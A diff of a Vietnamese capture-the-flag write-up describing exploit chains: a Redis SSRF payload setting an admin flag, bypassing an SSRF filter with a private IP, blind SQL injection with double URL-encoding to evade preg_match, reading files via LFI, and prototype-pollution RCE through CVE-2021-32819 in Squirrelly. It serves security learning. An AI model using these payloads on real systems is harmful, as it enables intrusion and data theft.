@@ -9,7 +9,8 @@
 ``` inctf://redis:6379/_set {uid}_isAdmin yes ```
 ---
 ## Vuln Drive
-- /source để lấy source code -> /dev-test -> ssrf
+- /source để lấy source code -> 
+- /dev-test -> ssrf
 - Nhưng hàm 'url_validate(url)' Chặn các payload thông thường
 ``` 
 def url_validate(url):
@@ -36,7 +37,7 @@ def url_validate(url):
             print(url, hostname)
             return "cannot get you url :)"
 ```
-- Từ chức năng upload -> lfi /etc/hosts -> 1 đường dẫn khác
+- Câu này có 1 ip private, có thể kiếm trong /etc/hosts, thay vì localhost, mình có thể dùng ip private để bypass ssrf filter
 - Sử dụng đường dẫn đó để ssrf -> 1 trang php
 ```
 <?php
@@ -74,8 +75,10 @@ else
 ?>
 ```
 - SQLi!!! Phân tích code, cần làm query2 trả về sai và lợi dụng query3 để blind sqli(vì kết quả cuối cùng chỉ trả về cho ta Not hay Success)
-- Vì part1 đã chặn hết alphabet và kí tự ```'``` -> Sử dụng urlencode: 0x252527 - ```__'```
-- Phần part2, được gợi ý từ comment -> flag có thể nằm trong bảng adminfo.
+- Vì part1 sử dụng urldecode, nên ta có thể bypass replace bằng double url encode ```$inp=urldecode($inp);```, ```%25```-> ```%``` 
+- => ```urldecode(%2527)``` -> bypass preg_match
+- Từ comment query1 -> phải tìm path trong adminfo db
+- inject vào query 3 theo thứ tự path,name và sử dụng like 0x25{}25 để bypass preg_match part2
 - Payload:
 ```http://192.168.96.2/part1=0x252527&part2=path,name FROM adminfo WHERE path like 0x25{}25 UNION SELETE 1```
 - solve.py:
@@ -108,7 +111,7 @@ while 1:
       print(r3.text)
       break
 ```
-- Vì bị giới hạn độ dài nên tên file sẽ không được in ra hết (27 kí tự). Thêm 1 phần nhỏ sau chuỗi ra nhận được để lấy tiếp phần tiếp theo của file
+- Vì bị giới hạn độ dài nên tên file sẽ không được in ra hết (27 kí tự). Do đó để lấy 5 ký tự cuối, ta dùng path like 0x25{nửa_payload_cuối}25
 - LFI file đó => flag
 ![image](https://user-images.githubusercontent.com/58381595/129514986-0c4b8f5a-fb7c-4008-9e86-19b84005a1d9.png)
 ---
@@ -220,7 +223,7 @@ def verify_roles():
     });
 });
 ```
-- Yêu cầu: Gửi file JSON có thể RCE -> sử dụng "__proto__" để excute code
+- Yêu cầu: Gửi file JSON có thể RCE -> sử dụng "__proto__" để trigger cve của squirrelly (file package.json có hiển thị thông tin version bị vuln squirrelly: ^8.0.8 )
 - Sử dụng CVE-2021-32819, tham khảo: https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/
 - payload: 
 ```
